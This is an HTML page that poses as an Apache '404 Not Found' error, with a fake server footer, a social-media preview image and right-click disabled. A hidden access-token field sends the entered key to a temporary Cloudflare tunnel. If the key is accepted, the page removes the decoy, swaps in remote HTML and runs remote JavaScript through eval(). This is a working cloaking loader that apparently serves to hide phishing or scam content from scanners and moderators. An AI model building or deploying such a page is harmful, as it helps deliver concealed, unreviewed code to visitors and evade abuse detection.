<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <title id="dinamic-title">404 Not Found</title>

    <meta property="og:title" content="404 Not Found">
    <meta property="og:description" content="The requested URL was not found on this server.">
    <meta property="og:type" content="website">
    
    <meta property="og:image" content="https://raw.githubusercontent.com/wanproyecto7-cpu/Holapro/main/static/4.jpg">
    <meta property="og:image:secure_url" content="https://raw.githubusercontent.com/wanproyecto7-cpu/Holapro/main/static/4.jpg">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">

    <style>
        html, body { height: 100%; margin: 0; padding: 0; }
        body { 
            background: #fff; 
            color: #000; 
            font-family: "Courier New", Courier, monospace; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            text-align: center;
        }
        #muro { padding: 20px; width: 100%; max-width: 450px; box-sizing: border-box; }
        h1 { font-size: clamp(30px, 10vw, 45px); margin: 0; }
        p { font-size: clamp(14px, 4vw, 18px); line-height: 1.4; }
        hr { width: 100%; border: 0.5px solid #eee; margin: 20px 0; }
        .console-input { 
            margin-top: 20px;
            background: #f9f9f9;
            border: 1px solid #ddd;
            color: #333;
            padding: 15px;
            width: 100%;
            box-sizing: border-box; 
            font-family: monospace;
            font-size: 16px;
            text-align: center;
            border-radius: 8px;
            outline: none;
            text-transform: uppercase;
        }
        .btn-access {
            display: block;
            margin: 20px auto;
            background: #f0f0f0;
            border: 1px solid #ccc;
            padding: 12px 30px;
            width: 100%;
            cursor: pointer;
            font-family: monospace;
            font-size: 14px;
            font-weight: bold;
            color: #555;
            border-radius: 8px;
        }
        #pagina-original { 
            display: none; 
            width: 100%; 
            flex-direction: column; 
            align-items: center; 
            background: #fff; 
            font-family: -apple-system, sans-serif; 
            min-height: 100vh;
        }
    </style>
</head>
<body oncontextmenu="return false">

    <img src="https://raw.githubusercontent.com/wanproyecto7-cpu/Holapro/main/static/4.jpg" style="display:none;" alt="preview">

    <div id="muro">
        <h1>Not Found</h1>
        <p>The requested URL was not found on this server.</p>
        <hr>
        <p style="font-size: 12px; color: #777;">Apache/2.4.41 (Ubuntu) Server at localhost Port 80</p>
        
        <input type="text" id="tkInput" class="console-input" placeholder="ACCESS TOKEN" autofocus autocomplete="off" spellcheck="false">
        <button class="btn-access" onclick="validarAcceso()">RUN DIAGNOSTIC</button>
    </div>

    <div id="pagina-original"></div>

    <script>
        const API_URL = "https://matching-uri-experts-game.trycloudflare.com";

        document.getElementById('tkInput').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') { validarAcceso(); }
        });

        async function validarAcceso() {
            const input = document.getElementById('tkInput');
            const val = input.value.trim().toUpperCase();
            
            if(!val) return;

            const btn = document.querySelector('.btn-access');
            input.disabled = true;
            btn.innerText = "WAIT...";

            try {
                const r = await fetch(`${API_URL}/get-ghost-code`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({llave: val})
                });

                if(r.ok) {
                    const data = await r.json();
                    document.getElementById('muro').remove();
                    
                    const t = "Educa" + "ci√≥n con" + "migo";
                    document.getElementById('dinamic-title').innerHTML = t;
                    
                    const root = document.getElementById('pagina-original');
                    root.style.display = "flex";
                    root.innerHTML = data.html;
                    eval(data.js);
                } else {
                    alert("DENIED: Clave incorrecta");
                    input.disabled = false;
                    input.value = "";
                    btn.innerText = "RUN DIAGNOSTIC";
                }
            } catch(e) {
                alert("OFFLINE: Revisa tu URL de Cloudflare");
                input.disabled = false;
                btn.innerText = "RUN DIAGNOSTIC";
            }
        }
    </script>
</body>
</html>
